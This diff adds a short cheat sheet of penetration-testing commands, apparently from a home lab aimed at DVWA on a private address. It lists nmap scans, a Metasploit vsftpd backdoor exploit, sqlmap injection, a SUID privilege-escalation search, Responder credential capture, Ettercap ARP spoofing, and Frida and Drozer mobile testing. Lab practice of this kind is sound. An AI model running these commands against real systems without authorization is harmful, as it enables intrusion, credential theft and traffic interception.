@@ -1,0 +1,55 @@
+Nmap Commands
+--------------
+nmap -sn 192.168.11.0/24
+nmap -sV 192.168.11.129
+
+Metasploit Commands
+-------------------
+msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.11.129
+run
+
+SQLMap Commands
+---------------
+sqlmap -u "http://192.168.11.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=SESSIONID" --dbs
+
+Burp Suite Activities
+---------------------
+HTTP request interception
+Payload manipulation
+XSS testing
+SQL Injection testing
+
+Privilege Escalation Commands
+-----------------------------
+whoami
+uname -a
+find / -perm -4000 2>/dev/null
+crontab -e
+crontab -l
+
+Responder Commands
+------------------
+sudo responder -I eth0
+
+Ettercap Commands
+-----------------
+sudo ettercap -T -M arp:remote /192.168.11.129// /192.168.11.2//
+
+Wireshark Activities
+--------------------
+Packet capture
+Protocol analysis
+Traffic filtering
+
+Frida Commands
+--------------
+frida --version
+frida-trace -U -i "checkPassword" com.example.app
+
+Drozer Commands
+---------------
+adb devices
+adb install drozer-agent.apk
+drozer console connect
